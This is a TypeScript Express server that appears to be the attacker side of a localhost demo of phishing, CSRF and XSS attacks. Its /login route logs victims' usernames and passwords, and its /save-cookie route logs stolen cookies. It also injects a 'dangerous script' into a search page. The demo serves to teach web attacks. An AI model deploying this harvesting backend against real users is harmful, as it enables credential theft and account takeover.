import express from 'express'
import config from './config'

import { getDangerousScript } from '../utils/dangerous'

const hostname = 'localhost'

export function start(port: number) {
  const app = express()

  config(app)

  app.get('/', (_req, res) => {
    res.render('index')
  })

  app.get('/obvious', (_req, res) => {
    res.render('obvious')
  })

  app.get('/iframe', (_req, res) => {
    res.render('iframe')
  })

  app.get('/get', (_req, res) => {
    res.render('get')
  })

  app.get('/steal', (_req, res) => {
    res.render('steal')
  })

  app.get('/phishing', (_req, res) => {
    res.render('phishing')
  })

  app.post('/login', (req, res) => {
    console.log('STEALING username and password from user, can now impersonate!')
    console.log(`username: ${req.body.username}`)
    console.log(`password: ${req.body.password}`)
    console.log()
    res.redirect('http://localhost:3000/csrf/login')
  })

  app.get('/search-link', (_req, res) => {
    res.render('search-link')
  })

  app.get('/search-danger', (_req, res) => {
    res.render('search-danger', { dangerousScript: getDangerousScript(hostname, port) })
  })

  app.post('/save-cookie', (req, res) => {
    console.log('CAPTURED cookie from target!')
    console.log(`Cookie: ${req.body.cookie}`)
    console.log()
    res.sendStatus(204)
  })

  console.log(`- listening on port ${port} `)
  app.listen(port)
}